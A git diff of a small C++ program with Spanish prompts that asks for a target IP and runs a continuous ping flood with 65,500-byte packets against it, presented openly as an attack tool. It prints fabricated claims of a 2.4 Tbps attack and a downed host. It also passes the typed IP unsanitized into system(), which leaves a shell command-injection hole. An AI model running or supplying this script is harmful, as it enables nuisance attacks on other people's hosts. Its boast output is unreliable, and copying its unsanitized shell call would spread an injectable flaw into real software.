@@ -1,20 +1,26 @@
 #include <iostream>
+#include <string>
 
 int main()
 {
-  char *lol;
-  char *xd;
-  char *command[200] = {0};
-  std::cout << "Introducir la IP para atacar: ";
-  std::cin >> lol;
-  std::cout << "\nIntroducir el puerto para atacar: ";
-  std::cin >> xd;
-  #ifdef __linux__
-    snprintf(command, 200, "ping %s -c 99999 -q -s 65500", lol);
-  #else
-    snprintf(command, 200, "ping %s -t -l 65500 > nul", lol);
-  #endif
-  std::cout << "Atacando la IP: 127.0.0.1\nPuerto: 7777\nPotencia:2.4tbps\nStatus: Tumbada\nIP bajada por sls422 y braian samp samp....";
-  system(command);
-  return 0;
+	std::string ip;
+	std::cout << "digite su ip (no hondureña):";
+	std::cin >> ip;
+
+	std::string cockmando = "ping " + ip;
+	#if _WIN32
+	cockmando += " -t -l 65500 > nul";
+	#elif __linux__
+	cockmando += " -c 99999 -q -s 65500";
+	#endif
+  
+	std::cout << "Atacando la IP: " << ip << std::endl
+		<< "Puerto: 4220" << std::endl
+		<< "Potencia: 2.4tbps" << std::endl
+		<< "Status: Tumbada" << std::endl
+		<< "IP bajada por sls422 y braian samp samp...." << std::endl;
+  
+	system(cockmando.c_str());
+  
+  	return 0;
 }
